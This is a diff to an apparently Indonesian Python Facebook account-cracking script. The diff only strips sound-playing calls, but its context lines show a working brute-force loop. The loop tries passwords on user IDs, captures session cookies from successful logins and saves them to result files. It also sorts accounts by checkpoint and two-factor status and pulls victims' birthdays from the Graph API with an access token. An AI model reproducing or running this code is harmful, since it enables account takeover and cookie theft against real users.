@@ -1976,7 +1976,7 @@ class crackmenu:
                        except:
                            log_hasill(user, pw, "")
                     else:
-                       print ('\r%s[%s%s%s] %s%s|%s | %s      %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,user,pw,dob,Q));play_mpv('assalamualaikum.mp3')
+                       print ('\r%s[%s%s%s] %s%s|%s | %s      %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,user,pw,dob,Q))
                     wrt = ('%s|%s|%s'%(user,pw,dob))
                     open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                     cp.append(wrt)
@@ -2018,7 +2018,7 @@ class crackmenu:
                                open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                                break
                         else:
-                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q));play_mpv('assalamualaikum.mp3')
+                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q))
                         bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                         self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y)) 
                         open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y)) 
@@ -2032,24 +2032,24 @@ class crackmenu:
                     if opsii == "y" or "y" == opsii:
                        try:
                            bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
-                           log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
+                           log_hasill(fl.get("id"), i, dob)
                            self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                            open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                            break
                        except:
-                           log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
+                           log_hasill(fl.get("id"), i, "")
                            bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                            self.cp.append("%s|%s"%(fl.get("id"),i))
                            open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                            break
                     else:
-                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q));play_mpv('assalamualaikum.mp3')
+                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q))
                         self.cp.append("%s|%s"%(fl.get("id"),i))
                         bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                         open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                         break
                 elif log.get("status")=="success":
-                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,koki(log.get("cookies")),Q));play_mpv('assalamualaikum.mp3')
+                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,koki(log.get("cookies")),Q))
                         self.ok.append("%s|%s"%(fl.get("id"),i))
                         open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                         bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
@@ -2090,7 +2090,7 @@ class crackmenu:
                                open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                                break
                         else:
-                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q));play_mpv('assalamualaikum.mp3')
+                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q))
                         bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                         self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y)) 
                         open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y)) 
@@ -2104,24 +2104,24 @@ class crackmenu:
                     if opsii == "y" or "y" == opsii:
                        try:
                            bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
-                           log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
+                           log_hasill(fl.get("id"), i, dob)
                            self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                            open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                            break
                        except:
-                           log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
+                           log_hasill(fl.get("id"), i, "")
                            bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                            self.cp.append("%s|%s"%(fl.get("id"),i))
                            open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                            break
                     else:
-                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q));play_mpv('assalamualaikum.mp3')
+                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q))
                         self.cp.append("%s|%s"%(fl.get("id"),i))
                         bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                         open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                         break
                 elif log.get("status")=="success":
-                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,koki(log.get("cookies")),Q));play_mpv('assalamualaikum.mp3')
+                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,koki(log.get("cookies")),Q))
                         self.ok.append("%s|%s"%(fl.get("id"),i))
                         open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                         bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
@@ -2153,17 +2153,17 @@ class crackmenu:
                         dob = ("%s %s %s"%(str(d),m,str(y)))
                         if opsii == "y" or "y" == opsii:
                            try:
-                               log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
+                               log_hasill(fl.get("id"), i, dob)
                                self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                                open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                                break
                            except:
-                               log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
+                               log_hasill(fl.get("id"), i, "")
                                self.cp.append("%s|%s"%(fl.get("id"),i))
                                open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                                break
                         else:
-                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q));play_mpv('assalamualaikum.mp3')
+                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q))
                         bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                         self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y)) 
                         open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y)) 
@@ -2177,24 +2177,24 @@ class crackmenu:
                     if opsii == "y" or "y" == opsii:
                        try:
                            bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
-                           log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
+                           log_hasill(fl.get("id"), i, dob)
                            self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                            open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                            break
                        except:
-                           log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
+                           log_hasill(fl.get("id"), i, "")
                            bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                            self.cp.append("%s|%s"%(fl.get("id"),i))
                            open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                            break
                     else:
-                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q));play_mpv('assalamualaikum.mp3')
+                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q))
                         self.cp.append("%s|%s"%(fl.get("id"),i))
                         bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                         open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                         break
                 elif log.get("status")=="success":
-                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,""),Q);play_mpv('assalamualaikum.mp3')
+                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,""),Q)
                         self.ok.append("%s|%s"%(fl.get("id"),i))
                         open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                         bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
@@ -2252,7 +2252,7 @@ class crackmenu:
                    except:
                        log_hasill(user, pw, "")
                 else:
-                   print('\r%s[%sCP%s]%s %s|%s%s                %s' % (Q,K,Q,K,user,pw,ttl_,Q));play_mpv('assalamualaikum.mp3')
+                   print('\r%s[%sCP%s]%s %s|%s%s                %s' % (Q,K,Q,K,user,pw,ttl_,Q))
                 try:ttll_ = ("%s %s %s"%(day, month, year));bokep_japan_yang_terbaru("", user, pw, ttll_)
                 except:bokep_japan_yang_terbaru("", user, pw, "")
                 wrt = '%s|%s%s' % (user,pw,ttl_)
@@ -2281,7 +2281,7 @@ class crackmenu:
                 wrt = '%s|%s|%s' % (user,pw,coki)
                 ok.append(wrt)
                 open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
-                zczc = ('\r%s[%sOK%s]%s %s|%s|%s                 ' % (Q,I,Q,I,user,pw,coki));play_mpv('assalamualaikum.mp3')
+                zczc = ('\r%s[%sOK%s]%s %s|%s|%s                 ' % (Q,I,Q,I,user,pw,coki))
                 if infoong == "y":
                    cek_cookies_by_risky(user, coki, zczc)
                 else:
@@ -2294,7 +2294,7 @@ class crackmenu:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print('\r%s[%sCP%s]%s %s|%s|%s %s %s       ' % (Q,K,Q,K,user,pw,day,month,year));play_mpv('assalamualaikum.mp3')
+                    print('\r%s[%sCP%s]%s %s|%s|%s %s %s       ' % (Q,K,Q,K,user,pw,day,month,year))
                     wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
@@ -2306,7 +2306,7 @@ class crackmenu:
                     year  = ''
                 except:
                     pass
-                print('\r%s[%sCP%s]%s %s|%s                 ' % (Q,K,Q,K,user,pw));play_mpv('assalamualaikum.mp3')
+                print('\r%s[%sCP%s]%s %s|%s                 ' % (Q,K,Q,K,user,pw))
                 wrt = '%s|%s' % (user,pw)
                 cp.append(wrt)
                 open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
@@ -2396,17 +2396,17 @@ class crackmenu:
                     exit(war+"Silahkan Ganti Useragnets")
                 if "c_user" in session.cookies.get_dict():
                    if "Akun Anda Dikunci" in response.text:
-                      print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw}{M} AKUN INI KENAK SENSI NEW{Q}\n",end="");play_mpv('assalamualaikum.mp3')
+                      print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw}{M} AKUN INI KENAK SENSI NEW{Q}\n",end="")
                       CP += 1
                    else:
                       OK += 1
                       coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                      print(f"\r{Q}[{I}OK{Q}]{I} {user}|{pw}|{coki}{Q}\n",end="");play_mpv('assalamualaikum.mp3')
+                      print(f"\r{Q}[{I}OK{Q}]{I} {user}|{pw}|{coki}{Q}\n",end="")
                       open("Hasil/OK-"+durasi+".txt","a").write(user+"|"+pw+"|"+coki+"\n")
                       break
                 elif "checkpoint" in session.cookies.get_dict():
                    if "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
-                      print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw} {M}AKUN INI KENAK A2F ON\n",end="");play_mpv('assalamualaikum.mp3')
+                      print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw} {M}AKUN INI KENAK A2F ON\n",end="")
                    else:
                       CP += 1
                       if opsii == "y" or "y" == opsii:
@@ -2416,9 +2416,9 @@ class crackmenu:
                              log_hasill(user, pw, "")
                       else:
                          if "Lihat detail login yang ditampilkan. Ini Anda?" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
-                            print(f"\r{Q}[{I}OK{Q}] {I}{user}|{pw} {M}AKUN INI TAP YES :V\n",end="");play_mpv('assalamualaikum.mp3')
+                            print(f"\r{Q}[{I}OK{Q}] {I}{user}|{pw} {M}AKUN INI TAP YES :V\n",end="")
                          else:
-                            print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw}{Q}               \n",end="");play_mpv('assalamualaikum.mp3')
+                            print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw}{Q}               \n",end="")
                       open("Hasil/CP-"+durasi+".txt","a").write(user+"|"+pw+"\n")
                       break
                 else:
